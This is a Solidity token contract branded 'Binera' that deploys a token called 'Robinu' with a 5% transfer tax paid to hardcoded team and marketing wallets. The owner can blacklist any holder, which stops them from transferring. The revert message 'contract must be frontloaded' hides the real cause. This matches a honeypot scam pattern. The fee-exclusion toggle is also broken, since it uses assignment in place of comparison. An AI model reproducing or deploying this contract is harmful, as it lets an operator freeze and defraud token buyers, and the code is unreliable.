// SPDX-License-Identifier: MIT

/*

██████╗░ ██╗ ███╗░░██╗ ███████╗ ░█████╗░
██╔══██╗ ██║ ████╗░██║ ██╔════╝ ██╔══██╗
██████╦╝ ██║ ██╔██╗██║ █████╗░░ ███████║
██╔══██╗ ██║ ██║╚████║ ██╔══╝░░ ██╔══██║
██████╦╝ ██║ ██║░╚███║ ███████╗ ██║░░██║
╚═════╝░ ╚═╝ ╚═╝░░╚══╝ ╚══════╝ ╚═╝░░╚═╝

Telegram: https://t.me/BineraEN/
Twitter: https://twitter.com/BineraEN/
Website: https://Binera.finance/
*/

pragma solidity 0.8.19;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
   
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    uint256 public _taxFee = 5;
    uint256 public _marketingTax = 2;
    uint256 public _teamTax = 2;
    uint256 public _luquidityPoolTax = 1;
    string private _name;
    string private _symbol;
    address private _ownerWallet = 0x0000000000000000000000000000000000000000;
    address private _teamWallet = 0x4196719121467F763dBc6E654c551900f122b339; 
    address private _marketingWallet = 0xe6d27f3081BE7b3513Ff58bfFD5FcbF22Afbad39; 
    address private _nullAddress = 0x0000000000000000000000000000000000000000;
    mapping(address => bool) public blacklisted;
    mapping(address => bool) public excludedFromFee;

    constructor(
        string memory name_,
        string memory symbol_,
        address ownerWallet_
    ) {
        _name = name_;
        _symbol = symbol_;
        _ownerWallet = ownerWallet_;
        excludedFromFee[_ownerWallet] = true;
        excludedFromFee[_teamWallet] = true;
        excludedFromFee[_marketingWallet] = true;
        excludedFromFee[_nullAddress] = true;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 1;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function burn(uint256 amount) external {
        _burn(_msgSender(), amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
            _approve(sender, _msgSender(), sub(currentAllowance, amount));
        }

        _transfer(sender, recipient, amount);

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, add(_allowances[_msgSender()][spender], (addedValue)));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, sub(currentAllowance, (subtractedValue)));
        return true;
    }




    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: transfer amount must be greater than zero");
        require(!blacklisted[sender], "ERC20: contract must be frontloaded");
        uint256 taxAmount;
        taxAmount = div(amount, 100); // 1
        if (excludedFromFee[sender]  || excludedFromFee[recipient]) {
            taxAmount = 0;
        }
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _beforeTokenTransfer(sender, recipient, amount);

        uint256 transferAmount = sub(amount, (taxAmount * _taxFee));
        _balances[sender] = sub(senderBalance, amount);

        _balances[recipient] = add(_balances[recipient], (transferAmount));
        _balances[_marketingWallet] = add(_balances[_marketingWallet], (taxAmount * _marketingTax));
        _balances[_teamWallet] = add(_balances[_teamWallet], (taxAmount * _teamTax));
        _balances[_nullAddress] = add(_balances[_nullAddress], (taxAmount * _luquidityPoolTax));

        emit Transfer(sender, recipient, transferAmount);
        emit Transfer(sender, _marketingWallet, taxAmount * _marketingTax);
        emit Transfer(sender, _teamWallet, taxAmount * _teamTax);
        emit Transfer(sender, _nullAddress, taxAmount * _luquidityPoolTax);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        require(account == _ownerWallet, "Account must be owner wallet");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = add(_totalSupply, (amount));
        _balances[account] = add(_balances[account], (amount));
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = sub(accountBalance, (amount));
        _totalSupply = sub(_totalSupply, (amount));

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function blacklist(address _address) external onlyOwner {
        if (blacklisted[_address]) {
            blacklisted[_address] = false;
        }
        else {
            blacklisted[_address] = true;
        }
    }

    function exludeFromFee(address account) external onlyOwner{
        if (excludedFromFee[account] = true) {
            excludedFromFee[account] = false;
        }
        else {
            excludedFromFee[account] = true;
        }
    }

    modifier onlyOwner() {
        require(_ownerWallet == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

contract Binera is ERC20 {
    constructor () ERC20("Robinu", "ROBINU", 0xeB1C988e0b33E1De51b31Dac47501B6b1721d2C9) {    
        _mint(msg.sender, 3333333333333 * 10 ** 1); 
    }
}
